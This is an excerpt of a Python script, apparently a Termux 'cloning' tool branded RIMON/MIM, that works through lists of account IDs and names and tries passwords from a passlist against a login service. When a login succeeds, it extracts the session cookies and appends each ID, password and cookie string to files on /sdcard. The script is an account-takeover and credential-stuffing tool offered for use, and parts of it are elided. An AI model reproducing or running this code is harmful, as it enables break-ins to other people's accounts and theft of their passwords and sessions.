...
sys.stdout.write('\x1b]2;[🍁] RIMON\x07')
loop = 0
oks = []
cps = []
id = []
...
#━━━━[ UA SERVER]━━━━#
version = httpx.get("https://raw.githubusercontent.com/Legend-770/Legend-XD/refs/heads/main/version.txt").text.strip()
M1 = httpx.get("https://raw.githubusercontent.com/Rimon-880/Tool-Menu/refs/heads/main/M1.txt").text.strip()
M2 = httpx.get("https://raw.githubusercontent.com/Rimon-880/Tool-Menu/refs/heads/main/M1.txt").text.strip()
#━━━━[ BANNER/LOGO ]━━━━#
def logo():
...
$$ $$\$$ |$$ |  $$ |$$   ____|$$   ____|$$ |  $$ |
\$$$$$$ / \$$$$$$  |\$$$$$$$\ \$$$$$$$\ $$ |  $$ |
 \___$$$\  \______/  \_______| \_______|\__|  \__|-edit-Rimon
     \___|{rad}XD
{green}--------------------------------------
{green}[{green}🍁{green}] {green}DEVLOPER  {green}: {green}MST-MIM
{green}[{green}🍁{green}] {green}FACEBOOK  {green}: {green}TASFIYA-KHAN
{green}[{green}🍁{green}] {green}GITHUB    {green}: {green}RIMON-880
{green}[{green}🍁{green}] {green}VERSION   {green}: {green}0.5
{green}[{green}🍁{green}] {green}TODAY DATE{green}: {green}{today}
{green}--------------------------------------""")
#━━━━[ LINE ]━━━━#
def line():
        print(f"{green}--------------------------------------")
...
def FILE():
    global oks,cps
    logo()
    print(f"{green}[{green}🍁{green}] {green}EXAMPLE {green}>> {green}/sdcard/Rimon.txt");line()
...
def __MTDONE__(ids,names,passlist,total_ids):
    ...
    sys.stdout.write(f"\r\r{green}[MIM]<[🍪]>M1<{green}{green}{loop}{green}>~<{green}OK-{len(oks)}"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in q:
                ...
                oks.append(ids)
                open('/sdcard/MIM-M1-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break 
            else:
                continue
        loop+=1
...
def __MTDTWO__(ids,names,passlist,total_ids):
    global oks,cps,loop
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r\r{green}[MIM]<[🍪]>M2<{green}{green}{loop}{green}>~<{green}OK-{len(oks)}"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in q:
                cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\r{green}[MIM~OK]{green}>-<{green}{ids}{green} |{green} {pas}")
                oks.append(ids)
                open('/sdcard/MIM-M2-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break 
            else:
                continue
        loop+=1
